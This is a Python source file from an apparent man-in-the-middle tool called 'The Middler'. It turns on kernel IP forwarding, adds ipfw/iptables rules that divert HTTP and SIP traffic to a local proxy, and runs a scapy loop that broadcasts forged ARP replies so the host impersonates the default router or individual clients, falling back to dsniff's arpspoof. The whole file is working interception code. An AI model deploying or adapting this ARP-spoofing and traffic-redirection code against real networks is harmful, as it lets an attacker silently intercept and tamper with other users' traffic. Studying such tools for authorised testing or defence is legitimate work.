#!/usr/bin/env python

# This file contains the functions that make the current system intercept traffic.

import libmiddler as ml
# sys and os are both necessary
import sys
import os
import re
from subprocess import *
from time import sleep

from scapy.all import *

#######################
# Variable definitions
#######################

# Fix the operating_system variable to "nyd" for "not yet determined."

operating_system = "nyd"


##############
# Networking configuration parameter helper routines
##############

def find_my_default_router_and_interface():

    # On Linux, get the router IP address out of /proc/net/route
    #
    # You just need to translate the IP address in the third (gateway) column of the line that has eight 0's
    # (00000000) in its second (destination) column.

    # Use netstat -rn to figure out what the operating system's default router is and what
    # its Internet interface is.

    p = Popen("netstat -rn", shell=True, bufsize=100, stdin=PIPE, stdout=PIPE, close_fds=True)
    (child_stdin, child_stdout) = (p.stdin, p.stdout)

    # Now find the line corresponding to the default route.
    for line in child_stdout:
        # BSD and OS X
        if line.startswith("default"):
            fields = line.split()
            router_interface = fields[5]
            router_ip = fields[1]
            break
        elif line.startswith("0.0.0.0"):
            fields = line.split()
            router_interface = fields[7]
            router_ip = fields[1]
            break
    child_stdin.close()
    child_stdout.close()

    # If ml.interface isn't yet defined (say, by command line), define it to be
    # the same interface on which we send packets back out.

    if ml.interface == "":
        ml.interface = router_interface

    # Let's also store the router's IP address.
    ml.router_ip = router_ip

    return (router_interface,router_ip)

def find_mac_and_bcast(interface):
    # Run ifconfig for the named interface.
    ml.jjlog.debug("Trying to find mac for interface %s\n" % interface)
    p = Popen("ifconfig %s" % interface, shell=True, bufsize=100, stdin=PIPE, stdout=PIPE, close_fds=True)
    (child_stdin, child_stdout) = (p.stdin, p.stdout)

    # Just grab the line(s) that have a MAC address on them.
    if sys.platform == r"darwin":
        mac_line_pattern = "ether "
        bcast_line_pattern = r"broadcast "
    elif sys.platform == r"linux2":
        mac_line_pattern = r"HWaddr "
        bcast_line_pattern = r"Bcast:"

    ifconfig_lines = child_stdout.readlines()
    ether_lines = [ line for line in ifconfig_lines if line.find(mac_line_pattern) >= 0 ]
    bcast_lines = [ line for line in ifconfig_lines if line.find(bcast_line_pattern) >= 0]

    # If there are not MAC address lines, we're busted.
    if ether_lines == [] or bcast_lines == []:
        # Warn the user that we can't arpspoof if there are no interfaces
        ml.jjlog.debug( "    WARNING: cannot determine MAC or broadcast address for interface %s " % interface)
        ml.jjlog.debug( "    ARP spoofing deactivated.")
        print "find_mac routine failed.\n"
        return("NONE","NONE")
    else:
        # First, find the MAC address portion of the ether/HWaddr line
        etherline = ether_lines.pop()
        mac_offset = etherline.find(mac_line_pattern) + len(mac_line_pattern)
        mac_address = etherline[mac_offset:].rstrip("\r\n ")

        # Now, do the same for broadcast
        bcast_line = bcast_lines.pop()
        bcast_offset = bcast_line.find(bcast_line_pattern) + len(bcast_line_pattern)

        # Here's where things differ by plaform.  The bcast address isn't the last thing on
        # the line on Linux
        if sys.platform == r"linux2":
            bcast_line = bcast_line[bcast_offset:]
            bcast_end = bcast_line.find(" ")
            bcast_address = bcast_line[:bcast_end]
        else:
            bcast_address = bcast_line[bcast_offset:].rstrip("\r\n ")

        ml.jjlog.debug("Found MAC address %s and broadcast address %s!\n" % (mac_address,bcast_address) )

        return(mac_address,bcast_address)


####################################################################################################
### Firewall/routing setup, to route packets and capture connections                                                             #
####################################################################################################


def redirectIPFWstart():
    """This functions starts up the ipfw forwarding so that as this machine routes traffic, it redirects port 80 traffic to itself."""

    # Set up firewall to grab port 80 traffic flowing through this machine and send it
    # to the proxy.

    # For debugging where you can't run the program as root, or if you just like your security like that, you could
    # run the Middler's HTTP proxy on an unprivileged port, and use the rule below that's appropriate to your O/S to
    # redirect traffic to that port.
    #
    # OSX: ipfw add 1000 fwd 127.0.0.1,8080 tcp from any to 127.0.0.1 dst-port 80 in via lo0

    #
    # We need to know our interface name.
    #
    # Unless ml.interface has been set, let's set it to whatever interface you take to get to your
    # default route.
    #

    (interface,router_ip) = find_my_default_router_and_interface()

    # Run ipfw list, so we can look for a rule that starts with 01000
    ipfw_cmd=os.popen("/sbin/ipfw list","r")
    ipfw_lines=ipfw_cmd.readlines()
    ipfw_cmd.close()

    #
    # Create a list of ports we want to capture.
    #

    # List of tuples, where each tuple is:  [protocol,dest_port,proxy_port]
    # where dest_port is the port the traffic was originally destined for,
    # while proxy_port is the one on which we proxy that traffic.

    # First, put the SIP ports into the list.
    ml.redirection_ports = [ ["udp",5060,5060],["udp",5061,5061],["udp",10000,10000],["udp",64064,64064],["udp",44642,44642] ]
    # Now add the HTTP ports
    ml.redirection_ports.append(["tcp",int(ml.port),80])

    # Keep a rule number counter.
    ml.next_free_rule_number = 1000
    for port_tuple in ml.redirection_ports:
        (proto,dest_port,proxy_port) = port_tuple

        found_line=0
        for line in ipfw_lines:
            pattern = "^%d fwd 127\.0\.0\.1\,\d+ tcp from any to any dst-port %d in via" % (ml.next_free_rule_number,dest_port)
            if re.match(pattern,line):
                found_line=1

        if not found_line:
            ipfw_modify=os.popen("/sbin/ipfw add %d fwd 127.0.0.1,%d tcp from any to any dst-port %d in via %s" % (ml.next_free_rule_number,proxy_port,dest_port,interface) )
            print "DEBUG: Just ran /sbin/ipfw add %d fwd 127.0.0.1,%d tcp from any to any dst-port %d in via %s" % (ml.next_free_rule_number,proxy_port,dest_port,interface)
        ml.next_free_rule_number = ml.next_free_rule_number + 1

def redirectIPFWstop():
    for rule_number in xrange(1000,ml.next_free_rule_number):
        #print "DEBUG: Removing rule %d" % rule_number
        command = "/sbin/ipfw del %d" % rule_number
        os.system(command)

def OldredirectIPFWstop():

    # TODO: Adapt the above routine.
    # Run ipfw list, so we can look for a rule that starts with 01000
    ipfw_cmd=os.popen("/sbin/ipfw list","r")
    ipfw_lines=ipfw_cmd.readlines()
    ipfw_cmd.close()


    found_line=0
    for line in ipfw_lines:
        if re.match(r"^01000 fwd 127\.0\.0\.1\,\d+ tcp from any to any dst-port 80 in via",line):
            found_line=1

    if found_line:
        ipfw_modify=os.popen("/sbin/ipfw del 01000")

    found_line

def redirectPort(ports_to_redirect):

    if sys.platform == r"linux2":
        redirectIPTablesPort(ports_to_redirect)
    elif sys.platform == r"darwin":
        redirectIPFWPort(ports_to_redirect)

def redirectIPFWPort(ports_to_redirect):
    # List of tuples, where each tuple is:  [protocol,dest_port,proxy_port]
    # where dest_port is the port the traffic was originally destined for,
    # while proxy_port is the one on which we proxy that traffic.

    for port_tuple in ports_to_redirect:
        (proto,dest_port,proxy_port) = port_tuple
        #ipfw_modify=os.popen("/sbin/ipfw add %d fwd 127.0.0.1,%d tcp from any to any dst-port %d in via %s" % (ml.next_free_rule_number,proxy_port,dest_port,interface) )
        #command = "iptables -t nat -I PREROUTING -p %s --dport %d -j REDIRECT --to-ports %d" % tuple(port_tuple)
        command = "/sbin/ipfw add %d fwd 127.0.0.1,%d tcp from any to any dst-port %d in via %s" % (ml.next_free_rule_number,proxy_port,dest_port,interface)
        ml.next_free_rule_number = ml.next_free_rule_number + 1
        print "Redirecting %s port %d to The Middler's proxy on localhost:%d" % tuple(port_tuple)
        os.system(command)
        if port_tuple[0] == "tcp":
            ml.redirected_tcp_ports.append(port_tuple[1])
        elif port_tuple[0] == "udp":
            ml.redirected_udp_ports.append(port_tuple[1])


def redirectIPTablesPort(ports_to_redirect=(["tcp",80,80],)):

    # List of tuples, where each tuple is:  [protocol,dest_port,proxy_port]
    # where dest_port is the port the traffic was originally destined for,
    # while proxy_port is the one on which we proxy that traffic.

    for port_tuple in ports_to_redirect:
        #(proto,dest_port,proxy_port) = port_tuple
        command = "iptables -t nat -I PREROUTING -p %s --dport %d -j REDIRECT --to-ports %d" % tuple(port_tuple)
        print "Redirecting %s port %d to The Middler's proxy on localhost:%d" % tuple(port_tuple)
        os.system(command)
        if port_tuple[0] == "tcp":
            ml.redirected_tcp_ports.append(port_tuple[1])
        elif port_tuple[0] == "udp":
            ml.redirected_udp_ports.append(port_tuple[1])

def redirectIPTablesStart():
    """This function starts up the iptables forwarding so that as this machine routes traffic,
    it redirects traffic destined for specific ports to itself."""

    #
    # Create a list of ports we want to capture.
    #

    # List of tuples, where each tuple is:  [protocol,dest_port,proxy_port]
    # where dest_port is the port the traffic was originally destined for,
    # while proxy_port is the one on which we proxy that traffic.

    # First, put the SIP ports into the list.
    ml.redirection_ports = [ ["udp",5060,5060],["udp",5061,5061],["udp",10000,10000],["udp",64064,64064] ]
    # Now add the HTTP ports
    ml.redirection_ports.append(["tcp",80,ml.http_port])
    redirectIPTablesPort(ml.redirection_ports)


def redirectIPTablesStop():

    # Same logic as the start routine.
    # First, put the SIP ports into the list.
    #ml.redirection_ports = [ ["udp",5060,5060],["udp",5061,5061],["udp",10000,10000],["udp",64064,64064] ]
    # Now add the HTTP ports
    #ml.redirection_ports.append(["tcp",80,80])

    for port_tuple in ml.redirection_ports:
        #(proto,dest_port,proxy_port) = port_tuple
        command = "iptables -t nat -D PREROUTING -p %s --dport %d -j REDIRECT --to-ports %d" % tuple(port_tuple)
        print "Removing redirection of %s port %d to The Middler's proxy on localhost:%d" % tuple(port_tuple)
        os.system(command)


####################################################################################################
# ARP spoofing code
####################################################################################################

def lookup_mac_via_scapy(victim_ip):
    """This routine should only be called by arpspoof_via_scapy() or other routines that have already imported scapy."""

    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip),timeout=5)
    return(ans[0][1].sprintf(r"%Ether.src%"))



def arpspoof_via_scapy(impersonated_host, victim_ip):
    from scapy.all import ARP,IP,send,srp,sr1,conf

    # Note that we're using scapy, so the ARP spoof shutdown code knows it needs to send
    # corrective ARP replies.
    ml.arpspoof_via_scapy = 1

    pid = os.fork()
    if pid:
        ml.jjlog.debug("Forking to handle arpspoofing via process %d\n" % pid)
        # Let's add this process to a list of child processes that we will need to
        # explicitly shut down.

        ml.child_pids_to_shutdown.append(pid)

    else:
        # Turn off scapy's verbosity?
        conf.verb=0

        # Build an ARP response to set up spoofing
        arp_response = ARP()
        # define a constant for ARP responses
        const_ARP_RESPONSE = 2
        # Set the type to a ARP response
        arp_response.op = const_ARP_RESPONSE
        # Hardware address we want to claim the packet
        arp_response.hwsrc = ml.my_mac
        # IP address we want to map to that address
        arp_response.psrc = impersonated_host

        # Now set the ARP response target
        non_broadcast=0
        if non_broadcast:

            # MAC address and IP address of our victim
            arp_response.hwdst = lookup_mac_via_scapy(victim_ip)
            arp_response.pdst = victim_ip
        else:
            arp_response.hwdst = "ff:ff:ff:ff:ff:ff"
            arp_response.pdst = ml.my_broadcast

        # Issue the ARP response every 5 seconds
        while(1):
            send(arp_response)
            sleep(3)

        print "Arpspoofing dying"
        exit


def set_up_arpspoofing(target_host="ALL",interface="defaultroute",impersonated_host="defaultrouter"):
    """This routine sets up ARP spoofing to get traffic on the local LAN to our
    system.    It uses the arpspoof() routine above to actually construct and send
    the packets."""

    # We start by determining our own MAC address on the interface of choice and
    # figuring out what our default gateway is.

    # We may indeed be using a different interface, particularly if we're
    # ARP spoofing on one interface and sending traffic out via a separate
    # network connection.    Imagine a dual-homed host that isn't the normal
    # router.    It could indeed start being the router!

    # We need to know the router ip, so we know who to impersonate.

    (router_interface,router_ip) = find_my_default_router_and_interface()
    ml.jjlog.developer_log("Router and interface were %s and %s" % (router_interface,router_ip) )

    # If the user doesn't request a specific interface, we use their default
    # interface.    If he doesn't request a specific target, we use his default
    # router.

    if (interface == "defaultroute"):
        ml.interface = router_interface
    else:
        ml.interface = interface
    if (impersonated_host == "defaultrouter"):
        impersonated_host = router_ip

    # Now, let's set up to send ARP replies either to a specifically-named target
    # or to everyone on the network except the default router.

    (ml.my_mac,ml.my_broadcast) = find_mac_and_bcast(ml.interface)

    if ml.my_mac == "NONE":
        exit(1)

    # TODO-Med: Allow the user to submit a list of interfaces.


    # Set a variable that tracks whether we used scapy
    ml.arpspoof_via_scapy = 0

    try:
        # Try to use scapy for this.
        import scapy

        arpspoof_via_scapy(impersonated_host,target_host)

    except ImportError:
        # If scapy isn't present, let's use dsniff's arpspooof program
        print "Arpspoofing requires either scapy or dsniff's arpspoof program.\n"
        print "Could not import scapy - using arpspoof instead.\n"

        call( ["arpspoof %s" % (impersonated_host),], shell=True, close_fds=True, stdout=PIPE,stderr=STDOUT)

def arpspoof_a_client(impersonated_host):
    '''Start arpspoofing to let us impersonate one of the clients on the network to the router.'''

    # Make sure that we're allowed to arpspoof
    if ml.toggle_arpspoof_off:
        ml.jjlog.debug("ARP spoofing off - not using ARP spoofing to impersonate a victim.")
        return

    # ...and if scapy is unavailable, let's use the arpspoof program.
    if ml.arpspoof_via_scapy == 0:
        call( ["arpspoof -t %s %s" % (ml.router,impersonated_host),], shell=True, close_fds=True, stdout=PIPE,stderr=STDOUT)

    # Otherwise, let's fork a process and run arpspoof via scapy.
    arpspoof_via_scapy(impersonated_host, ml.router_ip)




####################################################################################################
# Packet Routing                                                                                   #
####################################################################################################

def start():
    """Starts The Middler host's routing and launches the function to modify the
       operating system's firewall to route any packets destined for middled protocols' ports
       to the localhost interface instead, on the ports chosen."""

    # Activate forwarding on the operating system kernel.
    ml.jjlog.debug("Activating forwarding\n")

    # Check if we're on OS X.
    if sys.platform == r"darwin":

        # Activate forwarding on Darwin via sysctl
        os.system(r"sysctl -w net.inet.ip.forwarding=1")
        ml.jjlog.debug("On OSX - just set net.inet.ip.forwarding.")

        # Set up the firewall
        redirectIPFWstart()

    # Next check if we're on Linux
    elif sys.platform == r"linux2":

        # Activate packet forwarding via proc
        os.system(r"echo 1 >/proc/sys/net/ipv4/ip_forward")
        ml.jjlog.debug("On Linux - just set /proc/sys/net/ipv4/ip_forward to 1.")

        redirectIPTablesStart()

    # Next check if we're on Windows (Cygwin)
    elif sys.platform[:3] == r"win":
        print "ERROR: routing and network redirection code does not yet run on Windows"

    else:
        ml.jjlog.debug("Could not detect operating system or The Middler cannot yet support firewalling and routing on it.")


    # Now start the arpspoofing
    if not ml.toggle_arpspoof_off:
        set_up_arpspoofing()

def stop_arpspoofing():

    # Deactivate ARP spoofing.

    # TODO: If we used scapy, send out three ARP replies with the impersonated_host's
    #       real MAC address.  For now, don't worry about it.  ARP caches recover quickly.

    #if ml.arpspoof_via_scapy:
    pass


def stop():

    """Stops The Middler host's routing and launches the function to remove rules from the
       operating system's firewall that re-routed any packets destined for middled protocols' ports."""

    ml.jjlog.debug("Entered stopRedirection()")

    stop_arpspoofing()

    if sys.platform == "darwin":

        # Turn off the packet mangling / port redirecton
        redirectIPFWstop()
        ml.jjlog.debug("Just deactivated OSX firewall-based port redirection.")

        # Deactivate IPv4 forwarding on Darwin via sysctl
        os.system(r"sysctl -w net.inet.ip.forwarding=0")
        ml.jjlog.debug("Just deactivated IPv4 routing.")

    elif sys.platform == "linux2":

        # Turn off the packet mangling / port redirection.
        redirectIPTablesStop()
        ml.jjlog.debug("Just deactivated firewall-based port redirection.")

        # Deactivate packet forwarding via proc
        os.system(r"echo 0 > /proc/sys/net/ipv4/ip_forward")
        ml.jjlog.debug("Just deactivated IPv4 routing.")

    elif sys.platform[:3] == "win":
        print "ERRROR: routing redirection cannot be halted on Windows yet..."

    else:
        ml.jjlog.debug("Could not detect operating system or The Middler cannot yet support firewalling and routing on it.")
        ml.jjlog.debug(sys.platform)
